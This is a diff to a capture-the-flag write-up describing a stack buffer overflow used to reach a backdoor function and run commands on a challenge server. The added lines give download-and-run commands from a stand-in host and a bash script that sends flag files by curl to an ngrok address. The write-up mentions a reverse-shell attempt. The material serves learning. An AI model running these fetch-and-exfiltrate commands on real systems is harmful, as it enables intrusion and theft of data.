@@ -48,28 +48,35 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
 }
 ````
 
-<p align="justify">To exploit it, I started by running the docker on my machine to adjust my payload using the logs. I developped a tiny C script avalible under exploit.c in this repo, to guess the number of chars I had to sent before overwritte ret address on the stack. The method I followed is described below : </p>
+<p align="justify">To exploit it, I started by running the docker on my machine to adjust my payload using the logs. I developped a tiny C script available under exploit.c in this repo, to guess the number of chars I had to sent before overwritte ret address on the stack. The method I followed is described below : </p>
 
 - I started by extracting the server binary running in the docker
-- Then I extrated the address of the lalubackdoor using gdb
+- Then I extracted the address of the lalubackdoor using gdb
 - I used this address in little endian format crafting the payload like this : payload = 64* 'A' + [little endian backdoor address]. I started with 64 bytes because it was the size of the buffer
-- Then I sent the payload to the server and added one char at each loop, checking the logs in the meantine to identify the exact number of bytes required to perform a bof
+- Then I sent the payload to the server and added one char at each lap, checking the logs in the meaningtime to identify the exact number of bytes required to perform a bof
 
 <p align="justify">It came that I had to sent 72 chars before being able to overwritte the ret address and access lalubackdoor, as shown in the snippet below with the error on the execution of /bin/bash meaning that I well overwrote the ret address : </p>
 
 <p align="center"><img src="Screenshots/S2.png" alt="Desc"></p>
 
-The payload size once defined; I implemented a second C script to send command to run to the server so that I could have been able to read the flag, the script is available in exploit2.c in this repo. 
+<p align="justify"> The payload size once defined; I implemented a second C script to send commands to run to the server so that I could have been able to read the flag, the script is available in exploit2.c in this repo. This script adjusts payload size considering length of command and relay it to server to perform RCE. After a few tries I identified the directory /flag which was likely to contain the flag as shown in the screenshots below : </p>
 
 <p align="center"><img src="Screenshots/S3.png" alt="Desc"></p>
-
 <p align="center"><img src="Screenshots/S4.png" alt="Desc"></p>
 
-<p align="center"><img src="Screenshots/S5.png" alt="Desc"></p>
+<p align="justify"> Finaly after adjusting my payload locally, I opened a listening port on my machine and sent the bash script below to read the flag on the challenge server and extract it. Actually I tried to download and launch a compiled revshell but I failed because LibC (nc too) was missing on the server. I'v done it with 3 commands : </p>
 
+ - 1st : wget http://evilserv/exploit.sh
+ - 2nd : chmod +x exploit.sh
+ - 3rd : ./exploit.sj
+   
 ````bash
 #!/bin/bash
 cat /flag/* | curl -X POST --data @- http://6.tcp.eu.ngrok.io:13524/
 ````
+
+<p align="justify"> After that I received the flag : </p>
+
+<p align="center"><img src="Screenshots/S5.png" alt="Desc"></p>
 
 Flag : _RM{OffenSkillSaysWhat2024YouGotGowned}_ , thanks _Laluka_ for this challenge !
